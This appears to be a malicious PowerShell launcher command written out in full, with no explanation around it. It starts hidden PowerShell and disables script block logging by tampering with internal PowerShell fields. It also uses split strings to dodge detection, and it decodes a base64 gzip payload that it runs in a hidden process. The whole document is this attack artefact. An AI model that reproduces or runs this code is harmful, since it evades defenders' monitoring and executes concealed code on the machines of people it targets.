C:\Windows\SysWOW64\cmd.exe /c powershell.exe -nop -w hidden -noni -c " if ([System.IntPtr]::Size -eq 4) {     $psPath = Join-Path $env:windir 'sysnative\WindowsPowerShell\v1.0\powershell.exe' } else {     $psPath = 'powershell.exe' } $processStartInfo = New-Object System.Diagnostics.ProcessStartInfo $processStartInfo.FileName = $psPath $processStartInfo.Arguments = '-noni -nop -w hidden -c ' $logKey = 'Sc' + 'riptB' + 'lockLogging' if ($PSVersionTable.PSVersion.Major -ge 3) {     $enableLogging = 'EnableScriptBlockLogging'     $props = [Collections.Generic.Dictionary[string,System.Object]]::new()     $invocLog = 'EnableScriptBlockInvocationLogging'     $type1 = [Ref].Assembly.GetType('System.Management.Automation.Utils')     $type2 = [Ref].Assembly.GetType('System.Management.Automation.ScriptBlock')     if ($type2) {         $field = $type2.GetField('hasLogged', 'NonPublic,Static')         if ($field) {             $field.SetValue($null, $true)         }     }     $groupPolicySettings = $type1.GetField('cachedGroupPolicySettings', 'NonPublic,Static')     if ($groupPolicySettings) {         $policies = $groupPolicySettings.GetValue($null)         if ($policies[$logKey]) {             $policies[$logKey][$enableLogging] = 0             $policies[$logKey][$invocLog] = 0         }         $props.Add($invocLog, 0)         $props.Add($enableLogging, 0)         $policies['HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\PowerShell\' + $logKey] = $props     } } else {     $legacyType = [Ref].Assembly.GetType('System.Management.Automation.ScriptBlock')     $legacyField = $legacyType.GetField('signatures', 'NonPublic,Static')     $legacyField.SetValue($null, (New-Object 'System.Collections.Generic.HashSet[string]')) } $decodedScript = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('H4sIAGjWPGUA/2WRQY/aMBCF7/4Vo5TD9uBwR9pDRUhBWgpaQHuJVLnORHFx4mg8BqEt/x0nIBpp52BF1nuf35tMvAukMTOEmh1d4BWS+aw4eCRfqLIxbfGj6zLFqnhzWtlibTQ57youNi1mZE5YJGISyPTOmrnzs+n0fD6njJ5T7Zpp6KxTZdrVXQLwDdbqiOADIbCD4BGW+/12J0QVWs3GtXAY9DI3Fl8mVTy3iuvv8CkgDseI969+Vu3JHVG+x6fWyLUrQR5ikiGOfNxsnWeQq7bnwZMXhR4zrFSwPCcssWWjrH+SP8gwymXvTXZBa/S+CtZe4N4Gy9l/VjK4rqAV63qUbszIVRSXQ+UBMLKnsCByFG9+P0jiKsRPZDmvjS1XjA3IIfOXnzUsCWJ/HShu8h/kjhZK13Lz52+UPLKMFhrfSPPY45dqUFxviYCQAP0BAAA=')) $scriptBlock = [scriptblock]::create($decodedScript) $processStartInfo.Arguments += $scriptBlock.ToString() Write-Output $processStartInfo $processStartInfo.UseShellExecute = $false $processStartInfo.RedirectStandardOutput = $true $processStartInfo.WindowStyle = 'Hidden' $processStartInfo.CreateNoWindow = $true $process = [System.Diagnostics.Process]::Start($processStartInfo) " 
